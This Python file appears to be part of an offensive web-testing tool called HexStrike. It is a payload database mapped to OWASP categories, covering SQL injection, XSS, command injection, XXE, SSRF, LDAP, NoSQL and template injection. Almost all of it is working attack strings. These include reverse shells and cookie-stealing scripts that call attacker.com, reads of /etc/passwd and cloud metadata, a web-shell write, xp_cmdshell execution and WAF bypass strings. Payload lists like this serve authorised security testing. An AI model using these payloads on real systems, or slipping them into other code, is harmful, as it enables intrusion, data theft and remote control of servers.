#!/usr/bin/env python3
"""
HexStrike Free Edition - OWASP 2025 Payloads
Ported from v7 - Context7 Integration
"""

class OwaspPayloads:
    """OWASP Top 10 2021 injection patterns (December 2025)"""
    
    @staticmethod
    def load_patterns():
        """Load OWASP injection patterns from Context7"""
        return {
            "sql_injection_detection": {
                "boolean_based": [
                    "' AND 1=1--",
                    "' AND 1=2--",
                    "' OR '1'='1",
                    "' OR 'x'='x",
                    "admin' --",
                    "admin' #",
                    "' OR 1=1 LIMIT 1--"
                ],
                "time_based": [
                    "' AND SLEEP(5)--",
                    "'; WAITFOR DELAY '0:0:5'--",
                    "' AND IF(1=1,SLEEP(5),0)--",
                    "'; SELECT pg_sleep(5)--",
                    "' AND DBMS_LOCK.SLEEP(5)--"
                ],
                "union_based": [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT 1,2,3,4,5--",
                    "' UNION SELECT NULL,@@version--",
                    "' UNION SELECT username,password FROM users--"
                ],
                "error_based": [
                    "' AND 1=CONVERT(int, (SELECT @@version))--",
                    "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
                    "' AND 1=CAST(version() AS INT)--"
                ],
                "out_of_band": [
                    "'; exec master..xp_dirtree '\\\\\\\\attacker.com\\\\share'--"
                ],
                "second_order": [
                    "admin'||'",
                    "test'+UNION+SELECT+NULL--"
                ]
            },
            "xss_vectors": {
                "basic": [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg/onload=alert(1)>",
                    "<iframe src=javascript:alert(1)>",
                    "<body onload=alert(1)>"
                ],
                "filter_bypass_2025": [
                    "<ScRiPt>alert(1)</sCrIpT>",
                    "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoMSk='))\">",
                    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
                    "<details open ontoggle=alert(1)>",
                    "<K OnPointerRawUpdate=alert(1)>",
                    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
                    "<IMG src=x onerror=import('http://attacker.com/xss.js')>"
                ],
                "waf_bypass": [
                    "jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload='+/\\\"/+/onmouseover=1/+/[*/[]/+alert(1)//'> ",
                    "<svg><script>alert&#40;1)</script>",
                    "<iframe/src=\"data:text/html,<script>alert(1)</script>\">"
                ],
                "dom_based": [
                    "javascript:alert(document.cookie)",
                    "#<img src=x onerror=alert(1)>",
                    "data:text/html,<script>alert(1)</script>"
                ],
                "stored_xss": [
                    "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
                    "<img src=x onerror=this.src='http://attacker.com?c='+document.cookie>"
                ]
            },
            "command_injection": {
                "linux": [
                    "; ls -la",
                    "| cat /etc/passwd",
                    "& whoami",
                    "`id`",
                    "$(uname -a)",
                    "; curl http://attacker.com/$(whoami)",
                    "| nc -e /bin/sh attacker.com 4444",
                    "; bash -i >& /dev/tcp/attacker.com/4444 0>&1"
                ],
                "windows": [
                    "& dir",
                    "| type C:\\\\windows\\\\win.ini",
                    "; whoami",
                    "& net user",
                    "| powershell -c whoami"
                ],
                "blind": [
                    "; sleep 10",
                    "| ping -n 10 127.0.0.1",
                    "& timeout 10"
                ]
            },
            "xxe_2025": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
            ],
            "ssrf_2025": [
                "http://127.0.0.1",
                "http://localhost",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://[::]:80/",
                "file:///etc/passwd",
                "dict://127.0.0.1:11211/",
                "gopher://127.0.0.1:6379/_",
                "http://0.0.0.0",
                "http://2130706433"
            ],
            "ldap_injection": [
                "*",
                "*)(&",
                "*))%00",
                "admin)(&(password=*))",
                "admin)(!(&(|(password=*))))"
            ],
            "nosql_injection": [
                "{'$ne': null}",
                "{'$gt': ''}",
                "[$ne]=1",
                "username[$regex]=.*&password[$regex]=.*",
                "login[$nin][]=admin&password[$ne]=pass"
            ],
            "ssti_2025": {
                "jinja2": [
                    "{{ 7*7 }}",
                    "{{ config.items() }}",
                    "{{ ''.__class__.__mro__[1].__subclasses__() }}",
                    "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval('__import__(\"os\").popen(\"id\").read()') }}{% endif %}{% endfor %}"
                ],
                "freemarker": [
                    "${7*7}",
                    "<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('id')}"
                ],
                "thymeleaf": [
                    "${T(java.lang.Runtime).getRuntime().exec('calc')}"
                ]
            }
        }
    
    @staticmethod
    def build_database():
        """Build complete payload database with OWASP mapping"""
        patterns = OwaspPayloads.load_patterns()
        
        return {
            "sql_injection": {
                "description": "SQL Injection - Database manipulation (OWASP Top 10 2021 #3)",
                "cloudflare_blocks": False,
                "cwe": "CWE-89",
                "owasp_2021": "A03:2021-Injection",
                "all_payloads": (
                    patterns["sql_injection_detection"]["boolean_based"] +
                    patterns["sql_injection_detection"]["time_based"] +
                    patterns["sql_injection_detection"]["union_based"] +
                    patterns["sql_injection_detection"]["error_based"] +
                    patterns["sql_injection_detection"]["out_of_band"] +
                    [
                        "' UNION SELECT NULL,table_name FROM information_schema.tables--",
                        "' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--",
                        "' UNION SELECT NULL,concat(username,':',password) FROM users--",
                        "' UNION SELECT NULL,load_file('/etc/passwd')--",
                        "' INTO OUTFILE '/var/www/html/shell.php'--",
                        "'; SELECT pg_sleep(5)--",
                        "' UNION SELECT NULL,current_database()--",
                        "' UNION SELECT NULL,tablename FROM pg_tables--",
                        "'; EXEC xp_cmdshell('dir')--",
                        "'; EXEC sp_configure 'show advanced options',1--",
                        "' UNION SELECT NULL,banner FROM v$version--",
                        "' UNION SELECT NULL,table_name FROM all_tables--"
                    ]
                )
            },
            "xss": {
                "description": "Cross-Site Scripting (OWASP Top 10 2021 #3)",
                "cloudflare_blocks": True,
                "cwe": "CWE-79",
                "owasp_2021": "A03:2021-Injection",
                "all_payloads": (
                    patterns["xss_vectors"]["basic"] +
                    patterns["xss_vectors"]["filter_bypass_2025"] +
                    patterns["xss_vectors"]["waf_bypass"] +
                    patterns["xss_vectors"]["dom_based"] +
                    patterns["xss_vectors"]["stored_xss"]
                )
            },
            "command_injection": {
                "description": "OS Command Injection (OWASP Top 10 2021 #3)",
                "cloudflare_blocks": False,
                "cwe": "CWE-78",
                "owasp_2021": "A03:2021-Injection",
                "all_payloads": (
                    patterns["command_injection"]["linux"] +
                    patterns["command_injection"]["windows"] +
                    patterns["command_injection"]["blind"]
                )
            },
            "xxe": {
                "description": "XML External Entity (XXE) Attack",
                "cloudflare_blocks": False,
                "cwe": "CWE-611",
                "owasp_2021": "A05:2021-Security Misconfiguration",
                "all_payloads": patterns["xxe_2025"]
            },
            "ssrf": {
                "description": "Server-Side Request Forgery (OWASP Top 10 2021 #10)",
                "cloudflare_blocks": False,
                "cwe": "CWE-918",
                "owasp_2021": "A10:2021-Server-Side Request Forgery",
                "all_payloads": patterns["ssrf_2025"]
            },
            "nosql_injection": {
                "description": "NoSQL Injection (MongoDB, etc.)",
                "cloudflare_blocks": False,
                "cwe": "CWE-943",
                "owasp_2021": "A03:2021-Injection",
                "all_payloads": patterns["nosql_injection"]
            },
            "ssti": {
                "description": "Server-Side Template Injection",
                "cloudflare_blocks": False,
                "cwe": "CWE-94",
                "owasp_2021": "A03:2021-Injection",
                "all_payloads": (
                    patterns["ssti_2025"]["jinja2"] +
                    patterns["ssti_2025"]["freemarker"] +
                    patterns["ssti_2025"]["thymeleaf"]
                )
            },
            "ldap_injection": {
                "description": "LDAP Injection",
                "cloudflare_blocks": False,
                "cwe": "CWE-90",
                "owasp_2021": "A03:2021-Injection",
                "all_payloads": patterns["ldap_injection"]
            }
        }

# Quick test
if __name__ == "__main__":
    payloads = OwaspPayloads.build_database()
    print("OWASP 2025 Payload Database")
    print("="*50)
    for vuln_type, data in payloads.items():
        print(f"\n{vuln_type.upper()}")
        print(f"  CWE: {data['cwe']}")
        print(f"  OWASP: {data['owasp_2021']}")
        print(f"  Payloads: {len(data['all_payloads'])}")
    
    total = sum(len(data['all_payloads']) for data in payloads.values())
    print(f"\n{'='*50}")
    print(f"Total payloads: {total}")
